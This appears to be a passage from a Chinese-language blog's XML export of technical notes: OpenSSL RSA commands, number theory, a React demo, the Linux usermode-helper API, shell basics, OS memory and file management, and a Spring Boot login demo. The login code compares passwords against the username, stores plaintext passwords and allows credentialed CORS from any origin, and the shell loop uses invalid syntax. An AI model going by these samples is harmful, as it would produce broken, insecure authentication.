[-ssl] [-pkcs] [-x931] [-sign] [-verify][-encrypt] [-decrypt] [-rev] [-engine e] 12345678910openssl genrsa -des3 -out prikey.pem#生成RSA密钥openssl rsa -in prikey.pem -pubout -out pubkey.pemopenssl rsa -inform PEM -in pubkey.pem -pubin -text -out Keypub.txtopenssl rsa -pubin -in pubkey.pem -text -modulus#分离出公钥openssl rsautl -encrypt -pubin -inkey pubkey.pem -in a.txt -out b.txt#公钥加密openssl rsautl -decrypt -inkey prikey.pem -in b.txt#私钥解密 在线工具 分解整数. \(sage\):https://sagecell.sagemath.org/,https://cloud.sagemath.com/. python库 \(primefac\):整数分解库,包含了很多整数分解的算法. \(gmpy\):提供对\(GMP\)或\(MPIR\)多精度算术库的访问. \(gmpy2\):\(gmpy\)的升级版. \(pycrypto\):\(python\)加解密标准库. \(primefac\):\(p+1/p-1\)光滑.]]></content>
      <categories>
        <category>IS</category>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>非对称加密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Math-number-theory-基础]]></title>
    <url>%2Fposts%2Fe862dbfb%2F</url>
    <content type="text"><![CDATA[0x00 整数的可除性 整除与因数 设\(a\),\(b\)是任意两个整数,其中\(b \neq 0\).如果存在一个整数\(q\)使得等式\(a = q \cdot b\)成立,就称\(b\)整除\(a\)或者\(a\)被\(b\)整除,记作\(b | a\),并把\(b\)叫做\(a\)的因数.把\(a\)叫做\(b\)的倍数. 整除关系的传递性:\(c | b\),\(b | a\),则\(c | a\).因为\(a = q_1b = q_1q_2c\),\(q_1q_2\)也是整数,满足整除定义. 加法运算:\(c | b\),\(c | a\),则\(c | a \pm b\).因为\(a \pm b = q_1c \pm q_2c = (q_1 \pm q_2)c\),\(q_1 \pm q_2\)也是整数,满足整除定义. 整系数线性组合:\(c | b\),\(c | a\),对于任意整数\(s\),\(t\),则\(c | s \cdot a \pm t \cdot b\). 整除与相等:\(a | b\),\(b | a\),则\(a = \pm b\).]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>number-theory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-develop-FrontEnd-React-基础]]></title>
    <url>%2Fposts%2Fe81c4104%2F</url>
    <content type="text"><![CDATA[简介 React是一个声明式,高效且灵活的用于构建用户界面的JavaScript库.使用React可以将一些简短,独立的代码片段组合成复杂的UI界面,这些代码片段被称作组件. nodejs默认附带React. 1npx create-react-app my-app demo解析 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165import React from 'react';import ReactDOM from 'react-dom';import './index.css';//导入React项目基础模块//定义函数组件function Square(props) &#123; //props是定义的参数,可以接收父组件的数据 return ( //组件中return返回的是对渲染内容的轻量级描述,语法为JSX. /* 以下JSX编译后即以下代码 React.createElement("button", &#123; className: "square", onClick: props.onClick &#125;, props.value); */ &lt;button className="square" onClick=&#123;props.onClick&#125;&gt; &#123;props.value&#125; &lt;/button&gt; //button是原生组件 //通过props读取父组件传来的数据 );&#125;//定义组件类,继承React.Componentclass Board extends React.Component &#123; renderSquare(i) &#123; return ( &lt;Square value=&#123;this.props.squares[i]&#125; onClick=&#123;() =&gt; this.props.onClick(i)&#125; /&gt; //自定义组件的使用方法与原生组件类似,属性通过参数props传递,用于父子组件的数据通信 ); &#125; //render返回的即该组件的视图层次 render() &#123; return ( &lt;div&gt; &lt;div className="board-row"&gt; &#123;this.renderSquare(0)&#125; &#123;this.renderSquare(1)&#125; &#123;this.renderSquare(2)&#125; &lt;/div&gt; &lt;div className="board-row"&gt; &#123;this.renderSquare(3)&#125; &#123;this.renderSquare(4)&#125; &#123;this.renderSquare(5)&#125; &lt;/div&gt; &lt;div className="board-row"&gt; &#123;this.renderSquare(6)&#125; &#123;this.renderSquare(7)&#125; &#123;this.renderSquare(8)&#125; &lt;/div&gt; &lt;/div&gt; ); &#125;&#125;class Game extends React.Component &#123; constructor(props) &#123; super(props); //JavaScript class中每次定义其子类的构造函数时,都需要调用super方法,所有含有构造函数的的React组件中构造函数必须以super(props)开头. this.state = &#123; history: [ &#123; squares: Array(9).fill(null) &#125; ], stepNumber: 0, xIsNext: true &#125;; &#125; handleClick(i) &#123; const history = this.state.history.slice(0, this.state.stepNumber + 1); const current = history[history.length - 1]; const squares = current.squares.slice(); if (calculateWinner(squares) || squares[i]) &#123; return; &#125; squares[i] = this.state.xIsNext ? "X" : "O"; this.setState(&#123; history: history.concat([ &#123; squares: squares &#125; ]), stepNumber: history.length, xIsNext: !this.state.xIsNext &#125;); &#125; jumpTo(step) &#123; this.setState(&#123; stepNumber: step, xIsNext: (step % 2) === 0 &#125;); &#125; render() &#123; const history = this.state.history; const current = history[this.state.stepNumber]; const winner = calculateWinner(current.squares); const moves = history.map((step, move) =&gt; &#123; const desc = move ? 'Go to move #' + move : 'Go to game start'; return ( &lt;li key=&#123;move&#125;&gt; &lt;button onClick=&#123;() =&gt; this.jumpTo(move)&#125;&gt;&#123;desc&#125;&lt;/button&gt; &lt;/li&gt; ); &#125;); //map方法 let status; if (winner) &#123; status = "Winner: " + winner; &#125; else &#123; status = "Next player: " + (this.state.xIsNext ? "X" : "O"); &#125; return ( &lt;div className="game"&gt; &lt;div className="game-board"&gt; &lt;Board squares=&#123;current.squares&#125; onClick=&#123;i =&gt; this.handleClick(i)&#125; /&gt; &lt;/div&gt; &lt;div className="game-info"&gt; &lt;div&gt;&#123;status&#125;&lt;/div&gt; &lt;ol&gt;&#123;moves&#125;&lt;/ol&gt; &lt;/div&gt; &lt;/div&gt; ); &#125;&#125;ReactDOM.render(&lt;Game /&gt;, document.getElementById("root"));//项目的基本DOMfunction calculateWinner(squares) &#123; const lines = [ [0, 1, 2], [3, 4, 5], [6, 7, 8], [0, 3, 6], [1, 4, 7], [2, 5, 8], [0, 4, 8], [2, 4, 6] ]; for (let i = 0; i &lt; lines.length; i++) &#123; const [a, b, c] = lines[i]; if (squares[a] &amp;&amp; squares[a] === squares[b] &amp;&amp; squares[a] === squares[c]) &#123; return squares[a]; &#125; &#125; return null;&#125;]]></content>
      <categories>
        <category>CS</category>
        <category>develop</category>
      </categories>
      <tags>
        <tag>FrontEnd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-develop-Linux-LKM-内核API]]></title>
    <url>%2Fposts%2F1d2cce96%2F</url>
    <content type="text"><![CDATA[usermode-helper usermode-helper API中的核心函数. 12345678910call_usermodehelper_setup #准备user-land调用call_usermodehelper_setkeys#设置helper的会话密钥call_usermodehelper_setcleanup#为helper设置一个清空函数call_usermodehelper_stdinpipe#为helper创建stdin管道call_usermodehelper_exec#调用user-land 还有一些简化函数,它们封装了的几个内核函数. 123456call_usermodehelper#准备并调用user-landcall_usermodehelper_pipe#使用stdin管道调用user-landcall_usermodehelper_keys#使用会话密钥调用user-land 核心API使用了一个称为subprocess_info结构的处理函数引用进行操作,该结构(./kernel/kmod.c)集合了给定的usermode-helper实例的所有必需元. 该结构引用从call_usermodehelper_setup调用返回,在call_usermodehelper_setkey,call_usermodehelper_setcleanup以及call_usermodehelper_stdinpipe的调用中进一步配置. 通过调用call_usermodehelper_exec来调用配置好的用户模式应用程序. 123456789101112131415161718static int umh_test( void )&#123; struct subprocess_info * sub_info; char * argv[] = &#123;"/usr/bin/logger", "help!", NULL&#125;; static char * envp[] = &#123; "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL &#125;; //return call_usermodehelper( argv[0], argv, envp, UMH_WAIT_PROC ); sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC); if (sub_info == NULL) return -ENOMEM; return call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);&#125; 最直接的usermode-helper API应用程序是从内核空间加载内核模块,request_module函数封装对应功能并提供了简单的接口. 内核指定一个设备或所需服务并调用request_module来加载模块.通过使用usermode-helper API,模块通过modprobe加载到内核(应用程序通过request_module在用户空间被调用).]]></content>
      <categories>
        <category>CS</category>
        <category>develop</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-operations-Linux-shell脚本]]></title>
    <url>%2Fposts%2Fadc042af%2F</url>
    <content type="text"><![CDATA[基础 123456#!/bin/shcd ~for (i = 0;i &lt; 10;i++); do echo $idone 以#开头的行是注释,会被解释器忽略,#!用于告诉操作系统要用什么程序来执行这个脚本. 变量 定义变量时,变量名不加$,变量名和等号之间不能有空格,已定义的变量可以被重新定义. 12name="w4rd3n"name="hitworld" 除了显式地直接赋值,还可以用语句给变量赋值. 1for file in `ls` 使用变量要在变量名前面加$,变量名外面的花括号是可选的,加花括号是为了帮助解释器识别变量的边界. 123name="w4rd3n"echo $nameecho $&#123;name&#125; 字符串 字符串的定义可以用单引号,也可以用双引号,也可以不用引号. 单引号字符串里的任何字符都会原样输出,包括单引号和转义符. 双引号字符串里可以使用变量和转义字符. 字符串操作 1234567891011name="w4rd3n"greeting="hello, "$name"!\n"greeting_1="hello2, $name!\n"echo $greeting$greeting_1echo $greeting $greeting_1echo $&#123;#name&#125;# 获取字符串长度echo $&#123;greeting:1:4&#125;# 提取子字符串]]></content>
      <categories>
        <category>CS</category>
        <category>operations</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-operating-system-存储器管理]]></title>
    <url>%2Fposts%2Ffe3807bd%2F</url>
    <content type="text"><![CDATA[概念 存储管理的主要功能:内存分配和回收,共享,保护和扩充. 装载与链接 程序的装入和链接 将一个用户源程序变为一个可在内存中执行的程序,通常要经过:编译,链接,装入. 将一个装入模块装入内存时,可采用三种方式. 绝对装入方式:装入模块中用实际地址,装入预定地方,适用于单道环境. 可重定位方式:装入模块中为相对地址,由可重定位装入程序在装入时一次修改为绝对地址,适用于多道环境,地址变换通常是在装入时一次完成的,以后不再改变该地址,此变换过程称为静态重定位. 动态运行时装入方式:可重定位方式,不允许程序运行时在内存中移动位置,但实际运行中,程序在内存中的位置可能要改变.动态运行时的装入程序,在把装入模块装入内存后,并不立即把装入模块中的相对地址转换为绝对地址,而是把这种地址转换推迟到程序要真正执行时才进行,动态地址重定位.装入内存后的所有地址都仍是相对地址,为使地址转换不影响指令的执行速度,这种方式需要一定的特殊硬件的支持. 程序的链接 链接程序的功能,是将经过编译或汇编后所得到的一组目标模块以及它们所需要的库函数,装配成一个完整的装入模块. 实现链接的方法有三种:静态链接,装入时动态链接和运行时动态链接. 静态链接:在将这几个目标模块装配成一个装入模块时,须对相对地址进行修改,变换外部调用符号.链接时,把各目标模块的相对地址修改为统一的以0为始址的线性地址或多维地址空间,外部调用变为相对地址. 装入时动态链接:便于修改和更新,便于实现对目标模块的共享.应用程序在运行时,每次运行的模块无法预计,采用装入时动态链接只能将所有可能要运行的模块全部装入内存. 运行时动态链接:动态链接方式,是将对模块的链接推迟到执行时才执行,亦即,在执行过程中,当发现一个被调用模块尚未装入内存时,立即由OS去找到该模块并将之装入内存,把它链接到调用者模块上.凡在执行过程中未被用到的目标模块,都不会被调入内存和被链接到装入模块上,这样不仅可加快程序的装入过程,而且可节省大量的内存空间. 动态链接库的优点:节省内存;DLL中的函数改变时,不需要重新编译链接;用运行时动态链接可以使本次不用的函数不链接. 连续分配存储管理方式 连续分配是指为一个用户程序分配一个连续的内存空间. 单一连续分配 这是最简单的一种存储管理方式,但只能用于单用户,单任务的操作系统中. 内存分为以下两个分区:系统区,仅提供给操作系统使用,它可以驻留在内存的低址部分,也可驻留在内存的高址部分,由于中断向量通常驻留在低址部分,故OS通常也驻留在内存的低址部分;用户区,指除系统区以外的全部内存空间,提供给用户使用. 编程时可将作业分成四个段:即代码段,数据段,供程序使用的栈段,以及作为用户工作区的附加段.这几个段的地址空间可以邻接或分开,也可部分或全部重叠.由段寄存器左移4位加偏移值形成物理地址. 固定分区分配 固定分区式分配,是最早使用的一种可运行多道程序的存储管理方式.将内存空间划分为若干个固定大小的区域,每个分区大小可相同,也可不同.OS占一区,其余每个分区中可以装入一道作业.为了便于内存分配,系统需建立一张分区使用表.当有一用户程序要装入时,从表中找出一个能满足要求的,尚未分配的分区分配给该程序,然后修改分区使用表. 内存分配:将分区从小到大排队,建立一张分区使用表.当有程序要装入时,检索该表,找出能满足大小的分区,修改分配位.若未找到则失败. 动态分区分配 装入和处理过程中建立分区,使其大小和作业大小相等.分区数和大小都可变. 常用数据结构:空闲分区表,内存中每个尚未分配出去的分区设置一个表项(分区号,大小,起始地址,状态);空闲分区链,每个分区首尾,设置一些用于控制分区分配的信息,以及用于链接各分区的指针.状态位0未分配,1已分配. 分区分配算法 首次适应算法FF:空闲分区以地址递增的次序链接,分配时,从链首开始顺序查找,找到后,再按照作业的大小,从该分区中划出一块内存空间分配给请求者,余下的空闲分区仍留在空闲链中.优点:先利用内存中低址部分,故留下高址部分的大空闲区.缺点:低址部分留下许多无用留碎片,而每次查找又都从低址部分开始. 循环首次适应算法:是FF的改进,从上次找到的空闲分区的下一个开始查找.优点:该算法能使内存中的空闲分区分布比较均匀,从而减少查找空闲分区的时间.缺点:会缺乏大的空闲分区. 最佳适应算法:空闲分区按其从小到大的顺序链接,顺链找第一个满足要求的空闲区.缺点:会在留下许多难以利用的小空闲块. 分区分配操作 用某种分配算法,从空闲分区链(表)中找到所需的分区,若该分区大分为两部分,一部分分配出去,余下的部分仍留在空闲分区链或空闲分区表中,并修改空闲分区链(表),将分配区的首址返回给调用者. 回收内存 当一个作业运行完毕释放内存时,系统根据释放区的首地址,从空闲区说明表中找到相应的插入点. 此时可能出现下列四种情况. 回收区不与其他空闲块相连,为回收区单独建立一项新表目,填写回收区的起址和大小,并根据其起址,插入到空闲区说明表的适当位置. 回收区与前一个空闲分区相连时,将回收区与前一个空闲分区合并,不再为回收区分配新的表目,而只需修改前一个空闲分区表目的大小即可. 回收区与后一个空闲分区相连时,将两个空闲区合并,修改后一个空闲分区的表目,把回收区的起址作为新空闲区的起址,大小为两个分区之和. 回收区与前后两个空闲分区都相连时,合并三个分区,用前一个空闲分区表目的起址作为新空闲区的起址,修改其大小为三块分区之和,最后取消后一个空闲分区的表目. 动态重定位分区分配 在系统不断地分配和回收中,必定会出现一些不连续的小的空闲区,称为外零头.虽然可能所有零头的总和超过某一个作业的要求,但是由于不连续而无法分配. 解决零头的方法是拼接,即向一个方向移动已分配的作业,使那些零散的小空闲区在另一方向连成一片.分区的拼接技术,一方面是要求能够对作业进行重定位,另一方面系统在拼接时要耗费较多的时间. 动态重定位:允许作业在内存中移动必须硬件(重定位寄存器)支持,执行时,访问的内存地址是相对地址与重定位寄存器中的地址相加而形成的.地址变换过程是在程序执行期间,随着对每条指令和数据的访问而自动进行的,故称为动态重定位. 动态重定位分区分配算法:当请求分配模块找不到足够大的自由分区分给用户时进行紧缩,判断空闲分区总和是否大于请求的大小,是则进行紧凑形成连续空闲区并修改相关数据结构,然后继续正常分配. 分区的存储保护 采用上下界限寄存器:OS将分区的上,下界置入上下界寄存器R上,R下,在运行过程中,将作业所形成的每一个访问存储器的物理地址D同上下界限寄存器中的内容相比较,如果不满足则产生地址中断,由OS进行处理. 采用基址限长寄存器:在逻辑地址一端设置一对寄存器实现存储保护,基址寄存器也起重定位的作用,存放该分区的起始地址,限长寄存器存放分配给作业的分区的大小.作业在运行时形成的有效地址(逻辑地址)D,如果不满足则产生地址越界中断. 由于在分区式管理中通常采用界限寄存器作为重定位寄存器和实现存储保护的手段,所以分区管理也称为界地址存储管理. 采用保护键:在IBM 360系统中使用保护键(Protection Key)的存储保护机制.在该系统中,内存分成16块,每块4K字节,每块设一个保护键(0-15).按块分配,一个作业各块相连,并给该作业分配一个键号,填入该作业的各块的保护键中(这个保护键相当于锁);并把该键号置入PSW的保护键字段(相当于钥匙).当程序执行时,如所访问的保护键与钥匙不匹配,则产生保护键违例中断. 对换 所谓对换,是指把内存中暂时不能运行的进程或者暂时不用的程序和数据,调出到外存上,以便腾出足够的内存空间,再把已具备运行条件的进程或进程所需要的程序和数据,调入内存.对换是提高内存利用率的有效措施. 为了能对对换区中的空闲盘块进行管理,在系统中应配置相应的数据结构,以记录外存的使用情况.其形式与内存在动态分区分配方式中所用数据结构相似,即同样可以用空闲分区表或空闲分区链.在空闲分区表中的每个表目中应包含两项,即对换区的首址及其大小,它们的单位是盘块号和盘块数. 进程的换出:系统首先选择处于阻塞状态且优先级最低的进程作为换出进程,然后启动盘块,将该进程的程序和数据传送到磁盘的对换区上.若传送过程未出现错误,便可回收该进程所占用的内存空间,并对该进程的进程控制块做相应的修改. 进程的换入:系统应定时地查看所有进程的状态,从中找出就绪状态但已换出的进程,将其中换出时间(换出到磁盘上)最久的进程作为换入进程,将之换入,直至已无可换入的进程或无可换出的进程为止. 基本分页存储管理方式 页面与页表 页面:页存储管理,是将一个进程的逻辑地址空间分成若干个大小相等的片,称为页面或页.为各页加以编号,从0开始.相应地,也把内存空间分成与页面相同大小的若干个存储块,称为(物理)块或页框(frame),也同样为它们加以编号,如0#块,1#块等等. 在为进程分配内存时,以块为单位将进程中的若干个页分别装入到多个可以不相邻接的物理块中.由于进程的最后一页经常装不满一块而形成了不可利用的碎片,称之为页内碎片. 在分页系统中的页面其大小应适中,且页面大小应是2的幂.页面若太小,一方面虽然可使内存碎片减小,从而减少了内存碎片的总空间,有利于提高内存利用率.但另一方面也会使每个进程占用较多的页面,从而导致进程的页表过长,占用大量内存,此外还会降低页面换进换出的效率. 地址结构 对某特定机器,其地址结构是一定的. 对于单级页表,若给定一个逻辑地址空间中的地址为A,页面的大小为L,则页号P为A/L(向下取整),页内地址d为A%L. 两级页表,访问外部页表寄存器获取外部页表地址,通过外部页号获取对应外部页表,再通过外部页内地址和外部页表获取块号和页内地址组成物理地址.多级页表依次类推. 地址变换机构 通过逻辑地址的高位获得页号X,通过页表寄存器获取页表的起始地址,访问对应的表项获得块号组成物理地址. 由于页表每次要从磁盘访问,所以有了常驻内存的快表,快表缓存一部分页表项(包括页号和对应的块号),通过输入寄存器获得快表地址. 分段存储管理]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>operating-system</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-operating-system-文件管理]]></title>
    <url>%2Fposts%2Fd882689f%2F</url>
    <content type="text"><![CDATA[文件和文件系统 文件,记录和数据项 基本数据项:用于描述一个对象的某种属性的字符集,是数据组织中可以命名的最小逻辑数据单位,即原子数据,又称为数据元素或字段.它的命名往往与其属性一致.基本数据项除了数据名外,还应有数据类型.例如,用于描述一个学生的基本数据项有:学号,姓名,年龄,所在班级等. 组合数据项:由若干个基本数据项组成的,简称组项.例如,经理便是个组项,它由正经理和副经理两个基本项组成.又如,工资也是个组项,它可由基本工资,工龄工资和奖励工资等基本项所组成. 记录是一组相关数据项的集合,用于描述一个对象在某方面的属性.一个记录应包含哪些数据项取决于需要描述对象的哪个方面. 文件是指由创建者所定义的,具有文件名的一组相关元素的集合,可分为有结构文件和无结构文件两种.在有结构的文件中,文件由若干个相关记录组成;而无结构文件则被看成是一个字符流.文件在文件系统中是一个最大的数据单位,它描述了一个对象集.例如,可以将一个班的学生记录作为一个文件.文件属性可以包括:文件类型,文件长度,文件的物理位置,文件的建立时间等. 文件类型和文件系统模型 文件按用途分类:系统文件,用户文件,库文件.按文件中数据的形式分类:源文件,目标文件,可执行文件.按存取控制属性分类:只执行文件,只读文件,读写文件. 文件系统模型:用户程序访问接口,接口调用对对象操纵和管理的软件集合,程序组合通过定义的对象及其属性操作资源. 对象及其属性:文件管理系统管理的对象有文件,它作为文件管理的直接对象;目录,方便用户对文件的存取和检索,对目录的组织和管理是方便用户和提高对文件存取速度的关键;磁盘(磁带)存储空间,文件和目录必定占用存储空间,对这部分空间的有效管理,不仅能提高外存的利用率,而且能提高对文件的存取速度. 对对象操纵和管理的软件集合:对文件存储空间的管理,对文件目录的管理,用于将文件的逻辑地址转换为物理地址的机制,对文件读和写的管理,以及对文件的共享与保护等功能. 文件系统的接口:文件系统通常向用户提供两种类型的接口,命令接口(touch)和程序接口(open). 文件操作 包括创建,删除,读写,截断文件和设置文件的读/写位置等. 打开操作:系统将指名文件的属性(包括该文件在外存上的物理位置)从外存拷贝到内存打开文件表的一个表目中,并将该表目的编号(或称为索引)返回给用户,之后用户通过该索引号对文件提出操作请求. 关闭操作:OS将会把该文件从打开文件表中的表目上删除掉. OS提供其他有关文件操作的系统调用,可将这些调用分成若干类:最常用的一类是有关对文件属性进行操作的,另一类是有关目录的,还有用于实现文件共享的系统调用和用于对文件系统进行操作的系统调用等. 文件的逻辑结构 任何一个文件都存在着两种形式的结构:逻辑结构,物理结构(指文件在外存上的存储组织形式). 文件逻辑结构的类型 有结构文件:顺序文件(又分为定长记录文件,变长记录文件),索引文件,索引顺序文件. 无结构文件:即流式文件,其长度以字节为单位,对流式文件的访问是采用读写指针来指出下一个要访问的字符,可以把流式文件看作是记录式文件的一个特例.在UNIX系统中所有的文件都被看作是流式文件. 顺序文件 第一种是串结构,各记录之间的顺序与关键字无关.通常的办法是由时间来决定,即按存入时间的先后排列,最先存入的记录作为第一个记录,其次存入的为第二个记录,依此类推. 第二种是顺序结构,指文件中的所有记录按关键字(词)排列,可以按关键词的长短从小到大排序,也可以从大到小排序,或按其英文字母顺序排序. 顺序文件的最佳应用场合,是在对诸记录进行批量存取时,也只有顺序文件才能存储在磁带上并能有效地工作. 在交互应用的场合,如果用户(程序)要求查找或修改单个记录,为此系统便要去逐个地查找诸记录.如果是可变长记录的顺序文件,则为查找一个记录所需付出的开销将更大,这就限制了顺序文件的长度. 顺序文件的另一个缺点是,增加或删除一个记录困难.可以为顺序文件配置一个运行记录文件或称为事务文件,把试图增加,删除或修改的信息记录于其中,规定每隔一定时间将运行记录文件与原来的主文件加以合并产生一个按关键字排序的新文件. 对于定长记录文件,如果要查找第i个记录可直接获得第i个记录相对于第一个记录首址的地址.然而,对于可变长度记录的文件,要查找其第i个记录时,须顺序地查找每个记录,从中获得相应记录的长度Li,然后才能计算出第i个记录的首址. 索引文件 索引文件通过索引号,长度和指针为表项组成的索引表来索引文件构成一个逻辑结构.索引顺序文件可以通过关键字来索引逻辑地址. 直接文件和哈希文件 对于直接文件,则可根据给定的记录键值,直接获得指定记录的物理地址.换言之,记录键值本身就决定了记录的物理地址.这种由记录键值到记录物理地址的转换被称为键值转换,组织直接文件的关键,在于用什么方法进行从记录值到物理地址的转换.哈希文件即将键值转换通过hash算法来实现. 外存分配方式 连续分配 即分配一片连续的储存空间储存文件.优点,顺序访问容易,速度快.缺点,要求有连续的存储空间,必须事先知道文件的长度. 链接分配 一个文件的信息存放在若干不连续的物理块中,各块之间通过指针连接,前一个物理块指向下一个物理块. 隐式链接 在文件目录的每个目录项中,都含有指向链接文件的第一个盘块和最后一个盘块的指针,而在每个盘块中都含有指向下一盘块的指针,最后一个盘块指向-1(表示EOF). 优点,可位于离散的磁盘空间,有利于文件插入和删除,有利于文件动态扩充.缺点,存取速度慢,不适于随机存取,可靠性问题,如指针出错. 显式链接 把用于链接文件各物理块的指针,显式地存放在一张链接表中,其表项就是下一个块号,文件属性中包含起始块号,通过起始块号访问对应表项知道下一个块号,EOF表示为该文件的最后一个块(原理对比利用数组实现逻辑链表).该表在整个磁盘中只有一张,称之为文件分配表(FAT16,FAT32),文件分配表常驻内存且占用一定的磁盘空间. 索引分配 链接分配方式不能支持高效的直接存取,FAT需占用较大的内存空间. 单级索引分配:一个文件的信息存放在若干不连续物理块中,系统为每个文件建立一个专用数据结构索引表,并将这些块的块号存放在一个索引表中.一个索引表就是磁盘块地址数组,其中第i个条目指向文件的第i块.当文件较大时,索引分配优于链接分配方式.当文件较小时,每建立一个文件,需分配一个索引块,索引块利用率极低.也就是保存直接地址. 多级索引分配:将一个大文件的所有索引表(二级索引)的地址放在另一个索引表(一级索引)中,缺点是要多次访问内存.也就是保存间接地址,按索引次数分为一次间接地址,多次间接地址. 混合索引分配方式:即混用单级索引分配和多级索引分配. 目录管理 文件控制块和索引结点]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>operating-system</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-develop-BackEnd-Spring-Boot-基础]]></title>
    <url>%2Fposts%2F78d1a8e0%2F</url>
    <content type="text"><![CDATA[demo 使用Intellij IDEA搭建一个SpringBoot + MySql + mybatis项目. 创建 Idea新建Spring Initializr项目,填写项目信息后(Java Version建议设置为8),选择Web -&gt; Spring Web(上面可以选择Spring Boot版本). Maven换源 右键选择Maven -&gt; Open 'settings.xml',换源. 12345678910111213&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;settings xmlns="http://maven.apache.org/SETTINGS/1.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd"&gt; &lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;/mirrors&gt;&lt;/settings&gt; 项目结构 bean demo 12345678910111213141516171819202122232425262728293031323334353637package com.w4rd3niadc.blog.bean;public class User &#123; private Long id; private String name; private String password; public User(Long id, String name, String password) &#123; this.id = id; this.name = name; this.password = password; &#125; public Long getId() &#123; return id; &#125; public void setId(Long id) &#123; this.id = id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getPassword() &#123; return password; &#125; public void setPassword(String password) &#123; this.password = password; &#125;&#125; controller demo 123456789101112131415161718192021222324252627282930313233343536373839package com.w4rd3niadc.blog.controller;import com.w4rd3niadc.blog.bean.User;import com.w4rd3niadc.blog.service.UserService;import io.swagger.annotations.Api;import io.swagger.annotations.ApiOperation;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;import javax.annotation.Resource;import java.util.List;@RestController@RequestMapping("/login")@Api(value = "Login Control")public class LoginController &#123; @Resource private UserService userService; @PostMapping("/check") @ApiOperation("检测用户名与密码") public boolean check( @RequestParam(value = "name") String name, @RequestParam(value = "password") String password ) &#123; List&lt;User&gt; list = userService.listAll(); String rName = list.get(0).getName(); String rPass = list.get(0).getName(); if (rName.equals(name) &amp;&amp; rPass.equals(password)) &#123; return true; &#125; else &#123; return false; &#125; &#125;&#125; mapper demo 12345678910111213package com.w4rd3niadc.blog.mapper;import com.w4rd3niadc.blog.bean.User;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Select;import java.util.List;@Mapperpublic interface UserMapper &#123; @Select("select * from user") List&lt;User&gt; listAll();&#125; service demo 123456789package com.w4rd3niadc.blog.service;import com.w4rd3niadc.blog.bean.User;import java.util.List;public interface UserService &#123; List&lt;User&gt; listAll();&#125; serviceImpl demo 12345678910111213141516171819202122package com.w4rd3niadc.blog.serviceImpl;import com.w4rd3niadc.blog.bean.User;import com.w4rd3niadc.blog.mapper.UserMapper;import com.w4rd3niadc.blog.service.UserService;import org.springframework.stereotype.Service;import javax.annotation.Resource;import java.util.List;@Servicepublic class UserServiceImpl implements UserService &#123; @Resource private UserMapper userMapper; @Override public List&lt;User&gt; listAll() &#123; List&lt;User&gt; list = userMapper.listAll(); return list; &#125;&#125; config 123456789101112131415161718192021222324252627282930313233343536package com.w4rd3niadc.blog.config;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.ApiInfo;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2;@Configuration@EnableSwagger2public class SwaggerConfig &#123; //指定扫描哪些包 @Bean public Docket createRestApi() &#123; return new Docket(DocumentationType.SWAGGER_2) .apiInfo(swaggerInfo()) .select() //要扫描的包路径 .apis(RequestHandlerSelectors.basePackage("com.w4rd3niadc.blog")) .paths(PathSelectors.any()) .build(); &#125; //配置swagger的基本信息 private ApiInfo swaggerInfo() &#123; return new ApiInfoBuilder() .title("blog for w4rd3n") .version("1.0") .description("api document") .build(); &#125;&#125; 1234567891011121314151617181920package com.w4rd3niadc.blog.config;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.config.annotation.CorsRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;@Configurationpublic class WebMvcConfig extends WebMvcConfigurerAdapter &#123; @Override public void addCorsMappings(CorsRegistry registry) &#123; registry.addMapping("/**") .allowedOrigins("*") .allowedMethods("*") .allowedHeaders("*") .maxAge(63000) .allowCredentials(true); &#125;&#125; application.properties 12345#src/main/resources/application.propertiesspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driverspring.datasource.url = jdbc:mysql://localhost:3306/blog?useUnicode=true&amp;characterEncoding=utf-8&amp;serverTimezone=UTC spring.datasource.username = userspring.datasource.password = passwd pom.xml 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://maven.apache.org/POM/4.0.0" 